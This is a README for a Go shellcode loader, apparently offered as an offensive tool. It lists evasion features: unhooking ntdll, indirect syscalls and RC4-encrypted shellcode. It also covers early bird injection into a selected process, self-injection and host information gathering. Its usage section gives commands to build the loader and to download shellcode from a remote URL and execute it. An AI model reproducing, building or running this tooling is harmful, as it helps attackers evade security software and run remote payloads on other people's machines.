# rc4 loader

a simple shellcode loader that uses rc4 encryption, indirect syscalls and some system pointer encoding for fun

## features

- unhooks ntdll
- gathers host information 
- rc4 encryption/decryption of shellcode
- demo mode with embedded messagebox shellcode
- download shellcode from remote url
- system pointer encoding/decoding (not used by loader but interesting to me so left it in)
- multiple injection attempts because either i suck or go sucks
- supports multiple injection methods:
  - early bird injection into selected process
  - self-injection using indirect syscalls

## usage

```bash
# show help
go run cmd/main.go -help

# run demo mode with default early bird injection
go run cmd/main.go -demo

# run demo mode with self-injection
go run cmd/main.go -demo -method indirect

# download and execute shellcode from url (early bird)
go run cmd/main.go -url <url>

# download and execute shellcode from url (self-injection)
go run cmd/main.go -url <url> -method indirect
```

## injection methods

- `earlybird` (default): Injects shellcode into a selected running process
- `indirect`: Self-injects the shellcode into the current process

## build

```bash
go build -o rc4loader.exe cmd/main.go
```

## requirements

- windows (uses native windows syscalls)
- go 1.19+

## output

- creates `info.txt` with host information
- displays encryption/decryption process
- shows injection attempts and results
- displays process selection menu (early bird mode only)

## author

me 